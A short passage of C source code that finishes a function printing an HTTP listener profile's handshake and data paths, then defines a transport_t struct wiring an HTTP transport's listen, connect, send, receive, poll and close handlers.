    printf("[HTTP-SRV] Listener profile set: hs=%s data=%s\n", ls->profile.http_path_hs, ls->profile.http_path_data);
}

transport_t TRANSPORT_HTTP = {
    .name           = "http",
    .listen         = http_listen,
    .connect        = http_connect,
    .accept         = http_accept,
    .send           = http_send,
    .recv           = http_recv,
    .poll           = http_poll,
    .close          = http_close,
    .close_listener = http_close_listener,
    .get_fd         = http_get_fd,
};